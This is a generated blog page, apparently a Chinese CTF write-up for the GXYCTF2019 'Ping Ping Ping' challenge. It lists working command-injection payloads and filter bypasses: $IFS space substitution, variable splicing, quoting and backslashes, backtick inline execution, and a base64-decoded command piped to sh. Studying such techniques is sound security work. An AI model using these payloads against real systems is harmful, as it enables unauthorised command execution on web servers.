@@ -1,0 +1,205 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ping - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[[GXYCTF2019]Ping Ping Ping]命令注入1.管道符
+； |  &amp;amp;  常用
+2.绕过
+绕过空格
+$IFS$9  &amp;lt;,&amp;lt;&amp;gt;,%20(space),%09,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/85E0B2FE93C1D59651632D67AC59568B.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ping</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ping</h1>
+        <div class="stuff">
+            <span>一月 05, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ping/" rel="tag">ping</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="GXYCTF2019-Ping-Ping-Ping-命令注入"><a href="#GXYCTF2019-Ping-Ping-Ping-命令注入" class="headerlink" title="[[GXYCTF2019]Ping Ping Ping]命令注入"></a>[[GXYCTF2019]Ping Ping Ping]命令注入</h1><p>1.管道符</p>
+<p>； |  &amp;  常用</p>
+<p>2.绕过</p>
+<p>绕过空格</p>
+<p>$IFS$9  &lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, I F S , {IFS},IFS,IFS</p>
+<p>3.过滤单词</p>
+<p>变量替换 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php </span><br></pre></td></tr></table></figure>
+
+<p>过滤bash用sh执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  </span><br><span class="line">//Y2F0IGZsYWcucGhw -&gt;cat flag.php,输出给base64还原然后sh执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>内联执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">//内联，就是将反引号内命令的输出作为输入执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>4.关键字过滤</p>
+<h5 id="方法一：特殊变量"><a href="#方法一：特殊变量" class="headerlink" title="方法一：特殊变量"></a>方法一：特殊变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$*</span><br><span class="line">$@</span><br><span class="line">$x    (x 代表 1-9)</span><br><span class="line">$&#123;x&#125;   (x&gt;=10)</span><br><span class="line">在没有传参的情况下，上面的特殊变量都是为空的 ca$&#123;21&#125;t a.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="方法二：反斜杠"><a href="#方法二：反斜杠" class="headerlink" title="方法二：反斜杠"></a>方法二：反斜杠</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t a.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法三：变量替换"><a href="#方法三：变量替换" class="headerlink" title="方法三：变量替换"></a>方法三：变量替换</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=ca;b=t;c=a.txt;aaab $c</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法四：引号"><a href="#方法四：引号" class="headerlink" title="方法四：引号"></a>方法四：引号</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x27;a&#x27;t flag.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>更多详情，查看以下文章</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/HelloCTF/p/13051220.html">GXYCTF2019]Ping Ping Ping(ping命令执行绕过Waf) - Hel10 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45655564/article/details/117395152">(41条消息) 命令注入————ctfhub（过滤cat、空格、目录分隔符、运算符、综合过滤练习）_小Low娃的博客-CSDN博客_ctfhub 命令注入 综合过滤</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">[[GXYCTF2019]Ping Ping Ping]命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">方法一：特殊变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%8F%8D%E6%96%9C%E6%9D%A0"><span class="toc-number">1.0.0.0.2.</span> <span class="toc-text">方法二：反斜杠</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%8F%98%E9%87%8F%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.0.0.0.3.</span> <span class="toc-text">方法三：变量替换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E5%BC%95%E5%8F%B7"><span class="toc-number">1.0.0.0.4.</span> <span class="toc-text">方法四：引号</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
